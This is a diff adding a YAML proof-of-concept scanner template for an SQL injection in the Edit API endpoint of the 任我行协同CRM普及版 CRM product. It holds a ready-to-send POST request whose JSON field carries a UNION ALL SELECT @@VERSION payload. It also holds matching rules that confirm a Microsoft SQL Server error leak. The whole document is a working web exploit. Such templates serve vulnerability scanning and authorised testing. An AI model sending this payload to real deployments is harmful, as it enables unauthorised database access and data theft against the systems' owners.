@@ -1,0 +1,17 @@
+id: poc-yaml-wecrm-pjb-edit-sqli
+info:
+  name: 任我行协同CRM普及版 Edit SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 任我行协同CRM
+requests:
+- method: POST
+  path: /crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1&timestamp=1&nonce=1&signature=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: enumType=69&data={"ID":"1","Name":"'+UNION+ALL+SELECT+@@VERSION--"}
+  expression: status_code == 200 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"Microsoft SQL Server") && !contains(body,"<")
+variables: {}
+transport: http
